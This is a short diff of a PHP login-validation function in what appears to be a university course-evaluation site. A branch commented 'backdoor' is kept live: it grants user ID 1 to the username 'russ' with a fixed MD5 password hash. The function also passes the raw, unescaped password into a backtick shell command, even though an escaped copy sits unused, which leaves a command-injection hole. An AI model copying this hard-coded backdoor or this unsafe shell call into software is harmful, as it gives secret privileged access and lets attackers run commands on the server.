@@ -179,18 +179,18 @@ function login_validate($uni,$password)
   
   // backdoor
   if ($uni == "russ" && md5($password) == "66ad52318087f29b3bafc774c0166478")
+    $user_id = 1;
+  else
   {
-    login_update(1);
-    return true;
+    $uni = escapeshellarg($uni);
+    $pw = escapeshellarg($password);
+    $user_id = (int) `/afs/thayer/web/eval/dnd-auth.pl $uni $password`;
   }
-  
-  $uni = escapeshellarg($uni);
-  $pw = escapeshellarg($password);
-  $user_id = (int) `/afs/thayer/web/eval/dnd-auth.pl $uni $password`;
 
   if ($user_id > 0) // valid user_id
   {  
     login_update($user_id);
+    pg_query("UPDATE USERS set lastlogin = NOW() WHERE user_id = $user_id", $wces, __FILE__, __LINE__);
     return true;
   }
   else if ($user_id == 0)
